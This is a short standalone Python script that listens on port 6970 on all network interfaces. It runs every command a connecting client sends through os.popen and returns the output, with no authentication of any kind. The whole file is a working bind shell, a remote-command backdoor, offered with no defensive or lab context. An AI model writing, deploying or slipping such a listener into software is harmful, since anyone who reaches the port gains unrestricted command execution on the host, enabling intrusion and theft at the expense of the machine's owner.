#!/usr/bin/env python3
import socket
import os
HOST='0.0.0.0'
PORT=6970
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen()
print("Server listening on port {}".format(PORT))
conn,addr=s.accept()
print("{} Connected with port {}...".format(addr[0], addr[1]))
while True:
	data= conn.recv(4096)
	if not data:
		break
	else:
		data=data.decode()
	print("[{}]: {} byte size:{}".format(addr[0], data,len(data)))
	if str(data[:(len(data)-2)]) == "exit()":
		print("Client exited with exit command...")
		break
	else:
		result=os.popen(str(data[:(len(data)-2)])).read()
		data="cmd:: `"+str(data[:(len(data)-2)])+"`"
		data= data+ "\r\n^ ------\r\n"
		data=data+result
		data=data+"\r\n ------ @@@ \r\n"
		conn.sendall(data.encode())
s.close()
